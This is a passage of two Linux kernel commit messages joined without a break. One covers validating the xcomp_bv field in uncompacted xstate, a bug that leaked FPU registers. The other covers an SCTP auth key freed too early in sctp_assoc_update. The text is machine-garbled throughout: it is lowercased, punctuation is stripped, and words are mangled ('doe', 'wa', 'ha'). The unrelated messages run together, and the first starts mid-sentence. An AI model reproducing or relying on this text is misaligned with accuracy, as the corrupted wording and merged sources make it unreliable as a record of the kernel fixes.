for another task using the ptrace_setregset request with nt_x86_xstate while rt_sigreturn can set them for the current task in either case register can be set to any value but the kernel assumes that the xsave area itself remains valid in the sense that the cpu can restore it however in the case where the kernel is using the uncompacted xstate format which it doe whenever the xsaves instruction is unavailable it wa possible for userspace to set the xcomp_bv field in the xstate_header to an arbitrary value however all bit in that field are reserved in the uncompacted case so when switching to a task with nonzero xcomp_bv the xrstor instruction failed with a gp fault this caused the warn_on_fpu err in copy_kernel_to_xregs to be hit in addition since the error is otherwise ignored the fpu register from the task previously executing on the cpu were leaked fix the bug by checking that the user supplied value of xcomp_bv is 0 in the uncompacted case and returning an error otherwise the reason for validating xcomp_bv rather than simply overwriting it with 0 is that we want userspace to see an error if it incorrectly provides an xsave area in compacted format rather than in uncompacted format note that a before in case of error we clear the task s fpu state this is perhaps non ideal especially for ptrace_setregset it might be better to return an error before changing anything but it seems the clear on error behavior is fine for now and it s a little tricky to do otherwise because it would mean we couldn t simply copy the full userspace state into kernel memory in

the association struct sctp_shared_key only hold a pointer to the actual key byte that is struct sctp_auth_bytes which keep track of user internally through refcounting naturally on assoc or enpoint destruction sctp_shared_key are being destroyed directly and the reference on sctp_auth_bytes dropped user space can add key to either list via setsockopt 2 through struct sctp_authkey and by passing that to sctp_auth_set_key which replaces or add a new auth key there sctp_auth_create_key creates a new sctp_auth_bytes with refcount 1 and in case of replacement drop the reference on the old sctp_auth_bytes a key can be set active from user space through setsockopt on the id via sctp_auth_set_active_key which iterates through either endpoint_shared_keys and in case of an assoc invokes one of various place sctp_auth_asoc_init_active_key sctp_auth_asoc_init_active_key computes the actual secret from local s and peer s random hmac and shared key parameter and return a new key directly a sctp_auth_bytes that is asoc asoc_shared_key plus drop the reference if there wa a previous one the secret which where we eventually double drop the ref come from sctp_auth_asoc_set_secret with intitial refcount of 1 which also stay unchanged eventually in sctp_assoc_update this key is later being used for crypto layer to set the key for the hash in crypto_hash_setkey from sctp_auth_calculate_hmac to close the loop asoc asoc_shared_key is freshly allocated secret material and independant of the sctp_shared_key management keeping track of only shared key in endpoint and assocs hence also commit 4184b2a79a76 net sctp fix memory leak in auth key management is independant of this bug here since it concern a different layer though same structure being used eventually asoc asoc_shared_key is reference dropped correctly on assoc destruction in sctp_association_free and when active key are being replaced in sctp_auth_asoc_init_active_key it always ha a refcount of 1 hence it s freed prematurely in sctp_assoc_update simple fix is to remove that sctp_auth_key_put from there which fix these panic fix 730fc3d05cd4 sctp implete sctp auth parameter processing signed
